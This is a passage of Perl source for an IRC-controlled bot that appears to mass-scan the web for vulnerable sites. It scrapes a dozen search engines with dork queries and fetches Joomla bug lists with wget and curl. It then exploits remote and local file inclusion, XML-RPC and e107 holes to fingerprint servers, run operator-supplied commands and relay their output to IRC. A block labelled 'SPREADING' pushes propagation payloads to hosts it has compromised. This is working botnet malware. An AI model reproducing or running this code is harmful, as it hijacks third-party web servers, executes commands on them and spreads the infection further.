  #my $url = "http://localhost/search/www.alltheweb.com.htm";
  my $url = "http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=".$num."&q=".$key."&o=".$p;
  my $murl;
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /<span class=\"ofSoMany\">(.+?)<\/span>/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,$colz{9}."AllTheWeb",$colz{13}." $h");
  }
  if ( $q =~ /<a  href=\"(.*?)\" class=\"rnavLink\">Next/ ) {
      my $nxurl = $1; if ($conf{showdbse} == 1){msgn($dbgchan,"AllTheWeb","$nxurl");}
  }
  while ( $q =~ m/<span class=\"resURL\">http:\/\/(.+?)<\/span>/g ) { push (@daftar, $1); }
  while ( $q =~ /<a  href=\"(.*?)\" class=\"rnavLink\">Next/ ) {
    $nxurl = $murl.htmltourl($1);
    $q = bukasitus($nxurl);
    while ( $q =~ m/<span class=\"resURL\">http:\/\/(.+?)<\/span>/g ) { push (@daftar, $1); }
  }
  return @daftar;
}
##[ GOODSEARCH ]##
sub se_goodsearch {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 0; my $max = 300; my $p = 1;
  #my $url = "http://localhost/search/www.goodsearch.com.html";
  my $url = "http://www.goodsearch.com/Search.aspx?Keywords=".$key."&page=".$p."&osmax=".$num;
  my $murl = "http://www.goodsearch.com/";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /of about <strong>(.+?)<\/strong>/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,$colz{9}."GoodSearch",$colz{13}." $h");
  }
  if ( $q =~ m/&nbsp;<span class=\"search_numberpager_nextprev\"><a href=\"(.+?)\">Next<\/a>/ ) {
      my $nxurl = $1; if ($conf{showdbse} == 1){msgn($dbgchan,"GoodSearch","$nxurl");}
  }
  while ( $q =~ m/<a href=\"(Redirect.+?)\">http:\/\/(.*?)<\/a>/g ) { push (@daftar, $2); }
  for ($p=2;$p<=$max;$p++) {
    $url = "http://www.goodsearch.com/Search.aspx?Keywords=".$key."&page=".$p."&osmax=".$num;
    $q = bukasitus($url);
    while ( $q =~ m/<a href=\"(Redirect.+?)\">http:\/\/(.*?)<\/a>/g ) { push (@daftar, $2); }
    if ( $q !~ m/<a href=\"(Redirect.+?)\">http:\/\/(.*?)<\/a>/g ) { return @daftar; }
  }
  return @daftar;
}
##[ UOL ]##
sub se_uol {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 10; my $max = 5000; my $p;
  #my $url = "http://localhost/search/busca.uol.com.br.htm";
  my $url = "http://mundo.busca.uol.com.br/buscar.html?q=".$key."";
  my $murl = "http://busca.uol.com.br";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /results\">(.+?)<\/strong>/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,$colz{9}."Uol",$colz{13}." $h");
  }
  if ( $q =~ /<a href=\"(.*?)\" class=\"next\">/ ) {
      my $nxurl = htmltourl($1); if ($conf{showdbse} == 1){msgn($dbgchan,"Uol","$nxurl");}
  }
  while ( $q =~ m/<dt><a href=\"http:\/\/(.*?)\">/g ) { push (@daftar, $1); }
  for ($p=1;$p<=$max;$p += $num) {
    $q = bukasitus("http://mundo.busca.uol.com.br/buscar.html?q=".$key."&start=".$p);
    while ( $q =~ m/<dt><a href=\"http:\/\/(.*?)\">/g ) { push (@daftar, $1); }
    if ( $q !~ /<dt><a href/ ) { return @daftar; }
  }
  return @daftar;
}
##[ LIVE ]##
sub se_live {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 10; my $max = 100; my $p;
  #my $url = "http://localhost/search/search.live.com.htm";
  my $url = "http://search.live.com/results.aspx?q=".$key."&go";
  my $murl =  "http://search.live.com";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /<a  class=\"sb_pagN\" href=\"(.*?)\" onmousedown/ ) {
      my $nxurl = $1; if ($conf{showdbse} == 1){msgn($dbgchan,"Live",htmltourl($nxurl));}
  }
  while ( $q =~ m/<h3><a href=\"http:\/\/(.*?)\"/g ) {
    my $l = $1 ; if ($l !~ /google/) { push (@daftar, $l); }
  }
  for ( $p=0;$p<=$max;$p += $num ) {
    $nxurl = $murl.htmltourl($1)."&go";
    $q = bukasitus("http://search.live.com/results.aspx?q=".$key."&first=".$p."&FORM=PORE");
    while ( $q =~ m/<h3><a href=\"http:\/\/(.*?)\"/g ) {
      my $l = $1 ; if ($l !~ /google/) { push (@daftar, $l); }
    }
  }
  return @daftar;
}
##[ CLUSTY ]##
sub se_clusty {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 50;
  #my $url = "http://localhost/search/clusty.com.htm";
  my $url = "http://clusty.com/search?query=".$key."&input-form=clusty-simple&v:sources=webplus";
  my $murl = "http://clusty.com";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /intronum\">(.+?)<\/span>/ ) {
    my $h = $1; $h =~ s/,//g; msgt($chan,$colz{9}."Clusty",$colz{13}." $h");
  }
  if ( $q =~ /<a class=\"listnext\" href=\"(.*?)\">next/ ) {
      my $nxurl = $1; if ($conf{showdbse} == 1){msgn($dbgchan,"Clusty",htmltourl($nxurl));}
  }
  while ( $q =~ m/<a target=\"_top\" href=\"http:\/\/(.*?)\"/g ) { push (@daftar, $1); }
  while ( $q =~ /<a class=\"listnext\" href=\"(.*?)\">next/ ) {
    $nxurl = $murl.htmltourl($1);
    $q = bukasitus($nxurl);
    while ( $q =~ m/<a target=\"_top\" href=\"http:\/\/(.*?)\"/g ) { push (@daftar, $1); }
  }
  return @daftar;
}
##[ LYCOS ]##
sub se_lycos {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 10; my $max = 200;  my $p;
  #my $url = "http://localhost/search/search.lycos.com.htm";
  my $url = "http://search.lycos.com/?loc=searchbox&tab=web&adf=on&query=".$key."&submit=image";
  my $murl =  "http://search.lycos.com/";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /<a href=\"(.*?)\">Next/ ) {
    my $nxurl = $1; if ($conf{showdbse} == 1){msgn($dbgchan,"Lycos","$nxurl");}
  }
  while ( $q =~ m/<a href=\"http:\/\/(.*?)\" onmouseover/g ) { push (@daftar, $1); }
  for ( $p=0;$p<=$max;$p++ ) {
    $q = bukasitus("http://search.lycos.com/?query=".$key."&page2=".$p."&tab=web");
    while ( $q =~ m/<a href=\"http:\/\/(.*?)\" onmouseover/g ) { push (@daftar, $1); }
    if ( $q !~ m/<a href=\"http:\/\/(.*?)\" onmouseover/g ) { return @daftar; }
  }
  return @daftar;
}
##[ VIRGILIO ]##
sub se_virgilio {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 20; my $max = 2000; my $p = 0;
  my $url =  "http://ricerca.alice.it/ricerca?qs=".$key."filter=1&site=&lr=&hits=".$num."&offset=".$p;
  my $murl = "http://ricerca.alice.it/";
  my $nxurl;
  my $q = bukasitus($url);
  if ( $q =~ /<span>(.*?) risultati per <b>/ ) {
    my $h = $1; $h =~ s/,//g; $h =~ s/\.//g;
    msgt($chan,$colz{9}."Virgilio",$colz{13}." $h");
  }
  if ( $q =~ /<a href=\".*\s+<a href=\"(.*?)\"><span>Avanti/ ) {
      my $nxurl = $1; if ($conf{showdbse} == 1){msgn($dbgchan,"Virgilio","$nxurl");}
  }
  while ( $q =~ m/<h3><a href=\"http:\/\/(.*?)\" class/g ) { push (@daftar, $1); }
  while ( $q =~ /<a href=\".*\s+<a href=\"(.*?)\"><span>Avanti/ ) {
    $nxurl = $murl.htmltourl($1);
    $q = bukasitus($nxurl);
    while ( $q =~ m/<h3><a href=\"http:\/\/(.*?)\" class/g ) { push (@daftar, $1); }
  }
  return @daftar;
}
##[ WEBDE ]##
sub se_webde {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 1; my $max = 100; my $p;
  for ( $p = 0;$p <= $max; $p += $num ) {
    my $url = "http://suche.web.de/search/web/?pageIndex=".$p."&su=".$key."&y=0&x=0&mc=suche\@web\@navigation\@zahlen.suche\@web";
    my $q = bukasitus($url);
    while ( $q =~ m/<span class=\"url\">http:\/\/(.*?)<\/span>/g ) { push (@daftar, $1); }
    if ( $q !~ /<span class=\"url\">http:\/\/(.*?)<\/span>/ ) { return @daftar; }
  }
  return @daftar;
}
##[ HOTBOT ]##
sub se_hotbot {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 1; my $max = 200; my $p;
  for ( $p = 0;$p <= $max; $p += $num ) {
    my $url = "http://www.hotbot.com/?query=".$key."&ps=&loc=searchbox&tab=web&mode=search&currProv=msn&page=".$p;
    my $q = bukasitus($url);
    while ( $q =~ m/<span class=\"grn\">http:\/\/(.+?)<\/span>/g ) {
      my $l = $1 ; if ($l !~ /hotbot/) { push (@daftar, $l); }
    }
    if ( $q !~ /<span class=\"grn\">http:\/\/(.+?)<\/span>/ ) { return @daftar; }
  }
  return @daftar;
}
##[ NETSCAPE ]##
sub se_netscape {
  my ($chan,$key,$nf) = @_;
  my @daftar;
  my $num = 1; my $max = 10; my $p;
  for ( $p = 0;$p <= $max; $p += $num ) {
    my $url = "http://search.netscape.com/search/search?query=".$key."&page=".$p."&y=0&x=0&st=webresults";
    my $q = bukasitus($url);
    while ( $q =~ m/url\">http:\/\/(.*?)<\/p>/g ) {
      my $l = $1 ; if ($l !~ /search.netscape/) { push (@daftar, $l); }
    }
    if ( $q !~ /url\">http:\/\/(.*?)<\/p>/ ) { return @daftar; }
  }
  return @daftar;
}
## END OF RUTIN SEARCH ENGINE ##

##[ BUG JOOMLA ]##
sub bugjoomla {
  my $mode = $_[0];
  my @bugz;
  system("lwp-download ".$joomlaz);
  system("curl -O ".$joomlaz);
  system("wget ".$joomlaz);
  open(FILE,"< joomla.txt");
  if ($mode eq "hitung") {
    my $baris = 0; my $buff;
    while (sysread FILE, $buff, 4096) { $baris += ($buff =~ tr/\n//); }
    close FILE;
    f_hapus("joomla.txt*");
    return $baris;
  }
  else {
    while ( my $r = <FILE> ) { $r =~ s/\n//g; push(@bugz,$r); }
    close(FILE);
    f_hapus("joomla.txt*");
    return @bugz;
  }
}

##[ MILW0RM ]##
sub milw0rm {
  my ($chan,$key) = @_;
  my $max = 10; my $i;
  #my $q = bukasitus("http://localhost/milw0rm_rfi.htm");
  my $q = bukasitus("http://milw0rm.com/search.php?dong=".urlen($key));
  irc_msg($chan," [milw0rm.com] $key ");
  while ( $q =~ m/<a href=\"\/exploits\/(.*?)\" target=\"_blank\" class=\"style14\">(.*?)<\/a>/g ) {
    $i++;
    my ($exp,$judul) = ($1,$2);
    irc_msg($chan,$colz{14}." $judul http://milw0rm.com/exploits/$exp ");
    sleep(1);
    return if ($i == $max);
  }
}

##[ BERSIH DORK ]##
sub bersihdork {
  my ($chan,$dork) = @_;
  if ( $dork =~ /inurl:|allinurl:|intext:|allintext:|intitle:|allintitle:/ ) {
    irc_msg($chan,$colz{9}." Membersihkan kata kunci Google.. ");
    $dork =~ s/^inurl://g;
    $dork =~ s/^allinurl://g;
    $dork =~ s/^intext://g;
    $dork =~ s/^allintext://g;
    $dork =~ s/^intitle://g;
    $dork =~ s/^allintitle://g;
  }
  return $dork;
}

##[ SORTIR LINK ]##
sub lnk_sortir {
  my @unik = ();
  my %ada  = ();
  foreach my $e ( @_ ) {
    next if $ada{ $e }++;
    push (@unik, $e);
  }
  return @unik;
}

##[ SARING LINK ]##
sub lnk_filter {
  my @unik = ();
  foreach my $url ( @_ ) {
    my $jelek = 0;
    foreach my $b ( @badlinkz ) {
      if ($url =~ /$b/) { $jelek = 1; }
    }
    if ($jelek == 0) { push (@unik, $url); }
  }
  return @unik;
}

##[ SUBLINK ]##
sub lnk_sub {
  my $link = $_[0];
  my (@links,$path);
  my ($host,@paths) = split(/\//,$link);
  $host .= "/";
  push (@links,$host);
  foreach my $e (@paths) {
    if ($e) {
      $path .= $e."/";
      my $sublink = $host.$path;
      push (@links,$sublink);
     }
  }
  return @links;
}

##[ INFO OS ]##
sub info_os {
  my $url = $_[0];
  my @info;
  my $h  = bukasitus($url.$Ckrid2."??");
  if ($url =~ /casper/){
  $h  = bukasituslfi($url."tes");
  }else{
  $h  = bukasitus($url.$Ckrid2."??");
  }
  my ($safe,$os,$uname,$server,$user,$uid,$dir,$perm,$hdd,$disfunc);
  while ( $h =~ m/<br>SAFE: (.+?)<br>/g ) { $safe = $1; }
  while ( $h =~ m/<br>OS: (.+?)<br>/g ) { $os = $1; }
  while ( $h =~ m/<br>UNAME: (.+?)<br>/g ) { $uname = $1; }
  while ( $h =~ m/<br>SERVER: (.+?)<br>/g ) { $server = $1; }
  while ( $h =~ m/<br>USER: (.+?)<br>/g ) { $user = $1; }
  while ( $h =~ m/<br>UID: (.+?)<br>/g ) { $uid = $1; }
  while ( $h =~ m/<br>DIR: (.+?)<br>/g ) { $dir = $1; }
  while ( $h =~ m/<br>PERM: (.+?)<br>/g ) { $perm = $1; }
  while ( $h =~ m/<br>HDD: (.+?)<br>/g ) { $hdd = $1; }
  while ( $h =~ m/<br>DISFUNC: (.+?)<br>/g ) { $disfunc = $1; }
  push (@info,$safe,$os,$uname,$server,$user,$uid,$dir,$perm,$hdd,$disfunc);
  return @info;
}

##[ SAFEMODE INFO ]##
sub safemode {
  my ($type,$chan,$situs,$bug,$engine) = @_;
  my $safemode; my $vurn; my $sb;
  if ($type == 1) { $vurn = "http://".$situs.$bug; $sb = $vurn; }
  else { $vurn = $situs; $sb = $vurn; }
  my ($safe,$os,$uname,$server,$user,$uid,$dir,$perm,$hdd,$disfunc) = info_os($vurn);
  if ($safe =~ /OFF/) { $safemode = "OFF"; } elsif ($safe =~ /ON/) { $safemode ="ON"; } else { $safemode ="-"; }
  if ($disfunc) { $disfunc = "[Disfunc][ $disfunc ]"; } else { $disfunc = ""; }
  if ($perm =~/W/) { $perm = "$perm"; } else { $perm = "$perm"; }
  my $statustgt = "[RFI]";
  if($sb =~ /casper/){$statustgt = "[LFI]";}
  my $S1 = $colz{9}.$statustgt.$colz{1}."[".$colz{4}.$safemode.$colz{1}."][".$colz{13}.$os.$colz{1}."][ ".$colz{12}.$sb.$colz{1}." ]";
  my $S2 = "[".$colz{14}."Uname".$colz{1}."][ ".$colz{10}.$uname.$colz{1}." ] [".$colz{14}."User".$colz{1}."][ ".$colz{10}.$user.$colz{12}." / $uid ".$colz{1}."] [".$colz{14}."Server".$colz{1}."][".$colz{10}." $server ".$colz{1}."] ";
  my $S3 = "[".$colz{14}."Dir".$colz{1}."][".$colz{10}." $dir $perm ".$colz{1}."] [".$colz{14}."HDD".$colz{1}."][".$colz{10}." $hdd ]".$colz{4}." $disfunc ";
  if ($type == 1) {
    irc_msg($dbgchan,$S1);
    if($safemode =~ /O/){ irc_msg($dbgchan,$S2); irc_msg($dbgchan,$S3); }
    irc_msg($chan,$colz{9}.$engine) if ($engine);
  }
  ##[ SPREADING ]##
  bukasitus($vurn.$spread."?");
  bukasituslfisprd($vurn);bukasituslfisprd2($vurn);
  sleep($conf{sleepz});
  irc_msg($chan,$S1);
  if($safemode =~ /O/){ irc_msg($chan,$S2); irc_msg($chan,$S3); }
}

##[ CEK SHELL ]##
sub cek_shell {
  my ($chan,$nick,$situs) = @_;
  my $q = bukasitus($situs.$Ckrid."?");
  print $q;
  if ($q =~ /Casper_Kae/) { safemode(2,$chan,$situs,"",""); }
  elsif ($q =~ /failed to open stream/){
	my $qlfi = bukasitus($situs.$lfitest);
	if ($qlfi =~ /HTTP_USER_AGENT/){ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."] $colz{12} ".$situs.$colz{8}.$lfitest);safemode(2,$chan,$situs.$lfitest."&casper=","",""); }
  }
  else { irc_msg($chan,$colz{9}.$nick.$colz{4}.", targetnya ga vurnerable!"); }
}

##[ ENCRYPT ]##
sub cr_encrypt {
my ($too,$dataenc) = @_;
my $teks      =$dataenc;
my $hashing   = "http://d00r.110mb.com/hash.php?enc=".$teks;
my $request   = HTTP::Request->new(GET=>$hashing);
my $useragent = LWP::UserAgent->new();
$useragent->timeout($conf{timeout});
my $response  = $useragent->request($request);
if ($response->is_success) {
	my $res   = $response->content;
	if ($res =~ m/MD5:([0-9,a-f]{32})<br>SHA1:([0-9,a-f]{40})<br>B64:(.*)/g) {
		my ($md5,$sha1,$base64) = ($1,$2,$3);
		irc_msg($too,$colz{14}."MD5    : ".$colz{13}.$teks.$colz{14}." -> ".$colz{12}.$md5);
		irc_msg($too,$colz{14}."Sha1   : ".$colz{13}.$teks.$colz{14}." -> ".$colz{12}.$sha1);
		irc_msg($too,$colz{14}."Base64 : ".$colz{13}.$teks.$colz{14}." -> ".$colz{12}.$base64);
	}
}
else { irc_msg($too,$colz{4}."MainHack Cannot open web code"); }
}

##[ DECRYPT ]##
sub cr_decrypt {
my ($too,$datadec) = @_;
my $hash      = $datadec;
my $cracker   = "http://md5.rednoize.com/?s=md5&q=".$hash;
my $request   = HTTP::Request->new(GET=>$cracker);
my $useragent = LWP::UserAgent->new();
$useragent->timeout($conf{timeout});
my $response  = $useragent->request($request);
if ($response->is_success) {
	my $res  = $response->content;
	if ($res =~ m/<div id=\"result\" >(.*)<\/div>/g) {
		my $result = $1;
		irc_msg($too,$colz{14}."md5 [RedNoize] ".$colz{13}.$hash.$colz{14}." -> ".$colz{12}.$result);
	}
	else {
		irc_msg($too,$colz{14}."md5 [RedNoize] ".$colz{13}.$hash.$colz{4}." not found.");
	}
}
else { irc_msg($too,$colz{4}."Cannot open Md5.RedNoize.cOm"); }
}

##[ CEK IP ]##
sub cr_ipcek {
my ($too,$dipcek) = @_;
my $ip      = $dipcek;
my $website = "http://www.ipligence.com/geolocation";
my ($useragent,$request,$response,%form);
undef %form;
$form{ip}  = $ip;
$useragent = LWP::UserAgent->new;
$useragent->timeout($conf{timeout});
$request   = POST $website,\%form;
$response  = $useragent->request($request);
if ($response->is_success) {
    my $res = $response->content;
	if ($res =~ m/Your IP address is (.*)<br>City: (.*)<br\/>Country: (.*)<br>Continent: (.*)<br>Time/g) {
		my ($ipaddress,$city,$country,$continent) = ($1,$2,$3,$4);
		irc_msg($too,$colz{14}."IP Address : ".$colz{13}.$ipaddress);
		irc_msg($too,$colz{14}."City       : ".$colz{13}.$city);
		irc_msg($too,$colz{14}."Country    : ".$colz{13}.$country);
		irc_msg($too,$colz{14}."Continent  : ".$colz{13}.$continent);
	}
	else { irc_msg($too,$colz{4}."IP-Location Invalid address or IP not found."); }
}
else { irc_msg($too,$colz{4}."IP-Location Cannot open www.ipligence.com"); }
}

##[ CEK ZIP ]##
sub cr_zipcek {
my ($too,$dzipcek) = @_;
my $zip       = $dzipcek;
my $website   = "http://www.zipinfo.com/cgi-local/zipsrch.exe?cnty=cnty&ac=ac&zip=".$zip."&Go=Go";
my $request   = HTTP::Request->new(GET=>$website);
my $useragent = LWP::UserAgent->new();
$useragent->timeout($conf{timeout});
my $response  = $useragent->request($request);
if ($response->is_success) {
	my $res  = $response->content;
	if ($res =~ m/<td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font>/g) {
		my ($city,$state,$zipcode,$county,$area) = ($1,$2,$3,$4,$6);
		irc_msg($too,$colz{14}."City Name   : ".$colz{13}.$city);
		irc_msg($too,$colz{14}."State Code  : ".$colz{13}.$state);
		irc_msg($too,$colz{14}."ZIP Code    : ".$colz{13}.$zipcode);
		irc_msg($too,$colz{14}."County Name : ".$colz{13}.$county);
		irc_msg($too,$colz{14}."Area Code   : ".$colz{13}.$area);
	}
	else { irc_msg($too,$colz{4}."US-ZIP $zip is not a valid ZIP code."); }
}
else { irc_msg($too,$colz{4}."US-ZIP Cannot open www.ZIPInfo.com"); }
}

##[ CMD USER ]##
sub cmd_lfi {
  my ($too,$situs,$cmduser) = @_;
  $cmdlfiu = $cmduser;
  my $qlfi = bukasituslficmd($situs.$lfitest);
  if ($qlfi =~ /HTTP_USER_AGENT/){
	irc_msg($too,"[".$colz{9}."CMDLFI".$colz{1}."][".$cmduser."] sudah dilaksanakan");
	
  }
  else { irc_msg($too,$colz{4}."target LFI ga vurnerable!"); }
  bukasituslfisprd($situs.$lfitest);bukasituslfisprd2($situs.$lfitest);
}
sub cmd_rfi {
  my ($too,$situs,$cmduser) = @_;
  $cmdrfiu = $cmduser;
  my $q = bukasitus($situs.$Ckrid2."?casper=".$cmduser);
  if ($q =~ /Casper_Kae/){
	irc_msg($too,"[".$colz{9}."CMDRFI".$colz{1}."][".$cmduser."] sudah dilaksanakan");
  }
  else { irc_msg($too,$colz{4}."target RFI ga vurnerable!"); }
  bukasitus($situs.$spread."?");
}
sub cmd_xml {
  my ($too,$situs,$cmduser) = @_;
  my $q = bukasituscrxml($situs,$cmduser);
     if($q =~ /casper(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
	irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
	irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
	irc_msg($too,$7);irc_msg($too,$8);sleep($conf{sleepz});
	irc_msg($too,$9);irc_msg($too,$10);sleep($conf{sleepz});
	irc_msg($too,$11);irc_msg($too,$12); }
     elsif($q =~ /casper(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
	irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
	irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
	irc_msg($too,$7);irc_msg($too,$8);sleep($conf{sleepz});
	irc_msg($too,$9);irc_msg($too,$10);sleep($conf{sleepz});
	irc_msg($too,$11); }
     elsif($q =~ /casper(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
	irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
	irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
	irc_msg($too,$7);irc_msg($too,$8);sleep($conf{sleepz});
	irc_msg($too,$9);irc_msg($too,$10);}
     elsif($q =~ /casper(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
	irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
	irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
	irc_msg($too,$7);irc_msg($too,$8);sleep($conf{sleepz});
	irc_msg($too,$9);}
     elsif($q =~ /casper(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
	irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
	irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
	irc_msg($too,$7);irc_msg($too,$8);}
     elsif($q =~ /casper(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
	irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
	irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
	irc_msg($too,$7);}
     elsif($q =~ /casper(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
	irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
	irc_msg($too,$5);irc_msg($too,$6);}
     elsif($q =~ /casper(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
	irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
	irc_msg($too,$5);}
     elsif($q =~ /casper(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
	irc_msg($too,$3);irc_msg($too,$4);}
     elsif($q =~ /casper(.*)\s+(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
	irc_msg($too,$3);}
     elsif($q =~ /casper(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);}
     elsif($q =~ /casper(.*)\s+(.*)kae/){
	irc_msg($too,$1);}
     elsif($q =~ /casper(.*)kae/){
	irc_msg($too,"[CMDXML][".$cmduser."] sudah dilaksanakan");
     }else{ irc_msg($too,$colz{4}."target XML ga vurnerable!"); }
}
sub cmd_e107 {
  my ($too,$situs,$cmduser) = @_;
  my $q = bukasituscre107($situs,$cmduser);
     if($q =~ /casper(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
	irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
	irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
	irc_msg($too,$7);irc_msg($too,$8);sleep($conf{sleepz});
	irc_msg($too,$9);irc_msg($too,$10);sleep($conf{sleepz});
	irc_msg($too,$11);irc_msg($too,$12); }
     elsif($q =~ /casper(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
	irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
	irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
	irc_msg($too,$7);irc_msg($too,$8);sleep($conf{sleepz});
	irc_msg($too,$9);irc_msg($too,$10);sleep($conf{sleepz});
	irc_msg($too,$11); }
     elsif($q =~ /casper(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
	irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
	irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
	irc_msg($too,$7);irc_msg($too,$8);sleep($conf{sleepz});
	irc_msg($too,$9);irc_msg($too,$10);}
     elsif($q =~ /casper(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
	irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
	irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
	irc_msg($too,$7);irc_msg($too,$8);sleep($conf{sleepz});
	irc_msg($too,$9);}
     elsif($q =~ /casper(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
	irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
	irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
	irc_msg($too,$7);irc_msg($too,$8);}
     elsif($q =~ /casper(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
	irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
	irc_msg($too,$5);irc_msg($too,$6);sleep($conf{sleepz});
	irc_msg($too,$7);}
     elsif($q =~ /casper(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
	irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
	irc_msg($too,$5);irc_msg($too,$6);}
     elsif($q =~ /casper(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
	irc_msg($too,$3);irc_msg($too,$4);sleep($conf{sleepz});
	irc_msg($too,$5);}
     elsif($q =~ /casper(.*)\s+(.*)\s+(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
	irc_msg($too,$3);irc_msg($too,$4);}
     elsif($q =~ /casper(.*)\s+(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);sleep($conf{sleepz});
	irc_msg($too,$3);}
     elsif($q =~ /casper(.*)\s+(.*)\s+(.*)kae/){
	irc_msg($too,$1);irc_msg($too,$2);}
     elsif($q =~ /casper(.*)\s+(.*)kae/){
	irc_msg($too,$1);}
     elsif($q =~ /casper(.*)kae/){
	irc_msg($too,"[CMDe107][".$cmduser."] sudah dilaksanakan");
     }else{ irc_msg($too,$colz{4}."target e107 ga vurnerable!"); }
}
##[ CEK RESPON ]##
